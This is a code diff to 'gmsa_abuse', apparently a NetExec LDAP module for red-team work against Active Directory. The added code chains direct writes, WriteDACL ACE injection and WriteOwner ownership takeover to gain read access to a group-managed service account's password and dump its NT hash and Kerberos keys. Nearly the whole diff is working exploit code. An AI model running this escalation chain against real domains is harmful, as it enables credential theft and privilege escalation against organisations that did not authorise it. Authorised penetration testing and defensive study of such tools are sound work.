@@ -1,9 +1,11 @@
+import struct
+import uuid as _uuid
 from binascii import hexlify
 
 from impacket.krb5 import constants
 from impacket.krb5.crypto import generate_kerberos_keys
 from impacket.ldap import ldaptypes
-from impacket.ldap.ldap import LDAPSessionError, MODIFY_DELETE, MODIFY_REPLACE
+from impacket.ldap.ldap import MODIFY_DELETE, MODIFY_REPLACE, LDAPSessionError
 from impacket.uuid import bin_to_string
 from ldap3.protocol.microsoft import security_descriptor_control
 from ldap3.utils.conv import escape_filter_chars
@@ -15,14 +17,20 @@ from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 # schemaIDGUID for ms-DS-GroupMSAMembership attribute
 GMSA_MEMBERSHIP_GUID = "888eedd6-ce04-df40-b462-b8a50e41ba38"
 
-# Rights that allow writing msDS-GroupMSAMembership on a gMSA object
-EXPLOITABLE_RIGHTS = {
+# Rights that allow directly writing msDS-GroupMSAMembership without extra steps
+DIRECT_WRITE_RIGHTS = {
     "GenericAll":      0x10000000,
     "GenericWrite":    0x40000000,
-    "WriteDACL":       0x00040000,
-    "WriteOwner":      0x00080000,
     "WriteProperties": 0x00000020,
 }
+
+# Rights that allow exploitation via DACL/Owner manipulation (handled automatically in ACTION=exploit)
+DACL_ABUSE_RIGHTS = {
+    "WriteDACL":  0x00040000,
+    "WriteOwner": 0x00080000,
+}
+
+EXPLOITABLE_RIGHTS = {**DIRECT_WRITE_RIGHTS, **DACL_ABUSE_RIGHTS}
 
 # Trustees that legitimately have write access — skip these in find output
 EXCLUDED_SID_SUFFIXES = ["-512", "-519", "-526", "-527"]  # Domain Admins, Enterprise Admins, Key Admins, Enterprise Key Admins
@@ -39,7 +47,9 @@ class NXCModule:
                  With PRINCIPAL=<account> only results for that account are shown.
       exploit -- grant PRINCIPAL read access to TARGET's gMSA password by patching
                  msDS-GroupMSAMembership, then dump the NT hash and Kerberos keys.
-                 The original SD is restored automatically unless RESTORE=false is set.
+                 Automatically escalates: direct write → WriteDACL (injects a
+                 temporary ACE) → WriteOwner (takes ownership then patches DACL).
+                 All temporary changes are restored unless RESTORE=false is set.
 
     Examples:
       netexec ldap <DC> -u <user> -p <pass> -M gmsa_abuse
@@ -49,7 +59,7 @@ class NXCModule:
     """
 
     name = "gmsa_abuse"
-    description = "Discover and exploit gMSA accounts via GenericWrite on msDS-GroupMSAMembership"
+    description = "Discover and exploit gMSA accounts via write rights on msDS-GroupMSAMembership"
     supported_protocols = ["ldap"]
     opsec_safe = False
     multiple_hosts = False
@@ -69,6 +79,7 @@ class NXCModule:
         TARGET      gMSA sAMAccountName to target (required for exploit)
         PRINCIPAL   Account to check/grant — for find: filter results to this
                     trustee; for exploit: the account that receives read access
+                    (defaults to the authenticated user when omitted)
         RESTORE     true (default) or false — restore original msDS-GroupMSAMembership
                     after dumping (only relevant for exploit)
         """
@@ -77,13 +88,9 @@ class NXCModule:
         self.principal = module_options.get("PRINCIPAL", "").strip()
         self.restore = module_options.get("RESTORE", "true").lower() != "false"
 
-        if self.action == "exploit":
-            if not self.target_gmsa:
-                context.log.fail("exploit requires TARGET=<gMSA sAMAccountName>")
-                raise ValueError("TARGET required")
-            if not self.principal:
-                context.log.fail("exploit requires PRINCIPAL=<account to grant read access>")
-                raise ValueError("PRINCIPAL required")
+        if self.action == "exploit" and not self.target_gmsa:
+            context.log.fail("exploit requires TARGET=<gMSA sAMAccountName>")
+            raise ValueError("TARGET required")
 
     def on_login(self, context, connection):
         self.context = context
@@ -153,14 +160,21 @@ class NXCModule:
                     continue
 
                 mask = ace["Ace"]["Mask"]["Mask"]
-                matched_rights = [r for r, v in EXPLOITABLE_RIGHTS.items() if mask & v]
 
-                if not matched_rights and ace_type == 0x05 and (mask & 0x00000020):
-                    obj_type = ""
-                    if ace["Ace"]["ObjectTypeLen"] != 0:
-                        obj_type = bin_to_string(ace["Ace"]["ObjectType"]).lower()
-                    if obj_type in ("", GMSA_MEMBERSHIP_GUID):
-                        matched_rights = ["WriteProperty(msDS-GroupMSAMembership)"]
+                if ace_type == 0x05:
+                    # Object-specific ACE: WriteProperty (0x20) is GUID-scoped.
+                    # Matching it blindly against the full mask causes false positives when
+                    # the ACE targets a different attribute.  Check the GUID explicitly.
+                    object_level = {k: v for k, v in EXPLOITABLE_RIGHTS.items() if k != "WriteProperties"}
+                    matched_rights = [r for r, v in object_level.items() if mask & v]
+                    if mask & 0x00000020:
+                        obj_type = ""
+                        if ace["Ace"]["ObjectTypeLen"] != 0:
+                            obj_type = bin_to_string(ace["Ace"]["ObjectType"]).lower()
+                        if obj_type in ("", GMSA_MEMBERSHIP_GUID):
+                            matched_rights.append("WriteProperty(msDS-GroupMSAMembership)")
+                else:
+                    matched_rights = [r for r, v in EXPLOITABLE_RIGHTS.items() if mask & v]
 
                 if not matched_rights:
                     continue
@@ -191,6 +205,11 @@ class NXCModule:
     # ------------------------------------------------------------------
 
     def _exploit(self):
+        # Default PRINCIPAL to the current authenticated user
+        if not self.principal:
+            self.principal = self.connection.username
+            self.context.log.display(f"No PRINCIPAL specified — using authenticated user: {self.principal}")
+
         # 1. Resolve PRINCIPAL to SID
         principal_sid = self._sid_for_account(self.principal)
         if not principal_sid:
@@ -218,27 +237,17 @@ class NXCModule:
             original_sd_bytes = bytes(parsed[0]["msDS-GroupMSAMembership"])
             self.context.log.debug("Original msDS-GroupMSAMembership backed up")
 
-        # 4. Build new SD granting PRINCIPAL FullControl read access
+        # 4. Build new SD granting PRINCIPAL read access
         new_sd_bytes = self._build_membership_sd(principal_sid)
 
-        # 5. Write new SD
-        self.context.log.display(f"Patching msDS-GroupMSAMembership to grant '{self.principal}' read access …")
-        try:
-            self.connection.ldap_connection.modify(
-                gmsa_dn,
-                {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, new_sd_bytes)]},
-            )
-            self.context.log.success("msDS-GroupMSAMembership patched successfully")
-        except LDAPSessionError as e:
-            self.context.log.fail(f"LDAP modify failed: {e}")
+        # 5. Write msDS-GroupMSAMembership — escalates automatically if direct write is denied
+        if not self._write_membership(gmsa_dn, new_sd_bytes):
             return
 
-        # 6. Read msDS-ManagedPassword (requires connection as PRINCIPAL or re-auth)
-        #    The current connection is already authenticated as a user that has GenericWrite,
-        #    but msDS-ManagedPassword is only returned when the caller's token is in
-        #    msDS-GroupMSAMembership.  After patching, the current session won't see it
-        #    unless the current account IS the PRINCIPAL.  We attempt the read and explain
-        #    the situation if it comes back empty.
+        # 6. Read msDS-ManagedPassword
+        #    Only returned when the caller's Kerberos token is listed in msDS-GroupMSAMembership.
+        #    If the current account IS the PRINCIPAL the read succeeds immediately; otherwise
+        #    the user must re-authenticate as PRINCIPAL and use --gmsa.
         resp2 = self.connection.search(
             searchFilter=f"(sAMAccountName={escape_filter_chars(self.target_gmsa)})",
             attributes=["sAMAccountName", "msDS-ManagedPassword"],
@@ -266,7 +275,7 @@ class NXCModule:
                 f"'netexec ldap <DC> -u {self.principal} -p <pass> --gmsa' to retrieve the hash."
             )
 
-        # 7. Restore original SD if requested
+        # 7. Restore original msDS-GroupMSAMembership if requested
         if self.restore and original_sd_bytes is not None:
             self.context.log.display("Restoring original msDS-GroupMSAMembership …")
             try:
@@ -278,7 +287,7 @@ class NXCModule:
             except LDAPSessionError as e:
                 self.context.log.fail(f"Failed to restore msDS-GroupMSAMembership: {e} — restore manually!")
         elif self.restore and original_sd_bytes is None:
-            self.context.log.display("msDS-GroupMSAMembership was absent before patching — deleting the added value ...")
+            self.context.log.display("msDS-GroupMSAMembership was absent before patching — removing added value ...")
             try:
                 self.connection.ldap_connection.modify(
                     gmsa_dn,
@@ -289,6 +298,174 @@ class NXCModule:
                 self.context.log.fail(f"Failed to remove msDS-GroupMSAMembership: {e} — remove manually!")
         else:
             self.context.log.display("RESTORE=false — msDS-GroupMSAMembership left patched")
+
+    def _write_membership(self, gmsa_dn: str, new_sd_bytes: bytes) -> bool:
+        """Write msDS-GroupMSAMembership, escalating through WriteDACL and WriteOwner paths if denied."""
+        self.context.log.display(f"Patching msDS-GroupMSAMembership to grant '{self.principal}' read access …")
+        try:
+            self.connection.ldap_connection.modify(
+                gmsa_dn,
+                {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, new_sd_bytes)]},
+            )
+            self.context.log.success("msDS-GroupMSAMembership patched (direct write)")
+            return True
+        except LDAPSessionError as e:
+            err = str(e).lower()
+            if not any(x in err for x in ("insufficientaccessrights", "result: 50")):
+                self.context.log.fail(f"LDAP modify failed: {e}")
+                return False
+
+        self.context.log.display("Direct write denied — attempting WriteDACL path …")
+        if self._exploit_via_dacl(gmsa_dn, new_sd_bytes):
+            return True
+
+        self.context.log.display("WriteDACL path failed — attempting WriteOwner path …")
+        if self._exploit_via_owner(gmsa_dn, new_sd_bytes):
+            return True
+
+        self.context.log.fail(
+            "All exploit paths exhausted — ensure you hold GenericAll, GenericWrite, "
+            "WriteProperties, WriteDACL, or WriteOwner on the gMSA object"
+        )
+        return False
+
+    def _exploit_via_dacl(self, gmsa_dn: str, new_sd_bytes: bytes) -> bool:
+        """Inject a temporary WriteProperty ACE via WriteDACL, write msDS-GroupMSAMembership, then restore the DACL."""
+        resp = self.connection.search(
+            searchFilter=f"(sAMAccountName={escape_filter_chars(self.target_gmsa)})",
+            attributes=["nTSecurityDescriptor"],
+            searchControls=security_descriptor_control(sdflags=0x04),
+        )
+        parsed = parse_result_attributes(resp)
+        if not parsed or "nTSecurityDescriptor" not in parsed[0]:
+            self.context.log.debug("WriteDACL path: cannot read nTSecurityDescriptor")
+            return False
+
+        original_ntsd = bytes(parsed[0]["nTSecurityDescriptor"])
+        attacking_sid = self._sid_for_account(self.connection.username)
+        if not attacking_sid:
+            self.context.log.debug("WriteDACL path: cannot resolve own SID")
+            return False
+
+        try:
+            modified_ntsd = self._inject_write_property_ace(original_ntsd, attacking_sid)
+        except Exception as e:
+            self.context.log.debug(f"WriteDACL path: ACE injection failed — {e}")
+            return False
+
+        try:
+            self.connection.ldap_connection.modify(
+                gmsa_dn,
+                {"nTSecurityDescriptor": [(MODIFY_REPLACE, modified_ntsd)]},
+                controls=security_descriptor_control(sdflags=0x04),
+            )
+            self.context.log.success("DACL patched — WriteProperty on msDS-GroupMSAMembership injected")
+        except LDAPSessionError as e:
+            self.context.log.debug(f"WriteDACL path: DACL write failed — {e}")
+            return False
+
+        write_ok = False
+        try:
+            self.connection.ldap_connection.modify(
+                gmsa_dn,
+                {"msDS-GroupMSAMembership": [(MODIFY_REPLACE, new_sd_bytes)]},
+            )
+            self.context.log.success("msDS-GroupMSAMembership patched via WriteDACL path")
+            write_ok = True
+        except LDAPSessionError as e:
+            self.context.log.debug(f"WriteDACL path: membership write failed after DACL injection — {e}")
+
+        try:
+            self.connection.ldap_connection.modify(
+                gmsa_dn,
+                {"nTSecurityDescriptor": [(MODIFY_REPLACE, original_ntsd)]},
+                controls=security_descriptor_control(sdflags=0x04),
+            )
+            self.context.log.success("DACL restored to original")
+        except LDAPSessionError as e:
+            self.context.log.fail(f"DACL restore failed: {e} — restore manually!")
+
+        return write_ok
+
+    def _exploit_via_owner(self, gmsa_dn: str, new_sd_bytes: bytes) -> bool:
+        """Take ownership via WriteOwner, escalate to WriteDACL path, then restore the original owner."""
+        resp = self.connection.search(
+            searchFilter=f"(sAMAccountName={escape_filter_chars(self.target_gmsa)})",
+            attributes=["nTSecurityDescriptor"],
+            searchControls=security_descriptor_control(sdflags=0x01),  # OWNER_SECURITY_INFORMATION
+        )
+        parsed = parse_result_attributes(resp)
+        if not parsed or "nTSecurityDescriptor" not in parsed[0]:
+            self.context.log.debug("WriteOwner path: cannot read nTSecurityDescriptor owner")
+            return False
+
+        original_ntsd_owner = bytes(parsed[0]["nTSecurityDescriptor"])
+        attacking_sid = self._sid_for_account(self.connection.username)
+        if not attacking_sid:
+            self.context.log.debug("WriteOwner path: cannot resolve own SID")
+            return False
+
+        try:
+            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=original_ntsd_owner)
+            new_owner = ldaptypes.LDAP_SID()
+            new_owner.fromCanonical(attacking_sid)
+            sd["OwnerSid"] = new_owner
+            modified_ntsd_owner = sd.getData()
+        except Exception as e:
+            self.context.log.debug(f"WriteOwner path: owner SD build failed — {e}")
+            return False
+
+        try:
+            self.connection.ldap_connection.modify(
+                gmsa_dn,
+                {"nTSecurityDescriptor": [(MODIFY_REPLACE, modified_ntsd_owner)]},
+                controls=security_descriptor_control(sdflags=0x01),
+            )
+            self.context.log.success("Object ownership taken — proceeding with WriteDACL path")
+        except LDAPSessionError as e:
+            self.context.log.debug(f"WriteOwner path: ownership write failed — {e}")
+            return False
+
+        write_ok = self._exploit_via_dacl(gmsa_dn, new_sd_bytes)
+
+        try:
+            self.connection.ldap_connection.modify(
+                gmsa_dn,
+                {"nTSecurityDescriptor": [(MODIFY_REPLACE, original_ntsd_owner)]},
+                controls=security_descriptor_control(sdflags=0x01),
+            )
+            self.context.log.success("Object owner restored to original")
+        except LDAPSessionError as e:
+            self.context.log.fail(f"Owner restore failed: {e} — restore manually!")
+
+        return write_ok
+
+    def _inject_write_property_ace(self, sd_bytes: bytes, trustee_sid_str: str) -> bytes:
+        """Prepend an ACCESS_ALLOWED_OBJECT_ACE granting WriteProperty on msDS-GroupMSAMembership to the existing DACL."""
+        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_bytes)
+        dacl = sd["Dacl"]
+
+        # Build raw ACCESS_ALLOWED_OBJECT_ACE (type 0x05):
+        # AccessMask(4) + Flags(4) + ObjectType GUID(16) + SID(variable)
+        access_mask = struct.pack("<I", 0x00000020)             # ADS_RIGHT_DS_WRITE_PROP
+        obj_flags = struct.pack("<I", 0x00000001)               # ACE_OBJECT_TYPE_PRESENT
+        guid_bytes = _uuid.UUID(GMSA_MEMBERSHIP_GUID).bytes_le  # 16 bytes, mixed-endian
+
+        sid_obj = ldaptypes.LDAP_SID()
+        sid_obj.fromCanonical(trustee_sid_str)
+        sid_bytes = sid_obj.getData()
+
+        ace_body = access_mask + obj_flags + guid_bytes + sid_bytes
+        ace_size = struct.pack("<H", 4 + len(ace_body))  # 4 = AceType(1)+AceFlags(1)+AceSize(2)
+        raw_ace = b"\x05\x00" + ace_size + ace_body
+
+        existing_data = bytes(dacl["Data"])
+        dacl["Data"] = raw_ace + existing_data
+        dacl["AceCount"] = dacl["AceCount"] + 1
+        dacl["AclSize"] = 8 + len(dacl["Data"])  # 8-byte ACL header
+        sd["Dacl"] = dacl
+
+        return sd.getData()
 
     # ------------------------------------------------------------------
     # Helpers
@@ -366,8 +543,8 @@ class NXCModule:
             parsed = parse_result_attributes(resp)
             if parsed:
                 return parsed[0].get("sAMAccountName", sid)
-        except Exception:
-            pass
+        except Exception as e:
+            self.context.log.debug(f"SID resolve for '{sid}' failed: {e}")
         return sid
 
     def _is_excluded_sid(self, sid: str) -> bool:
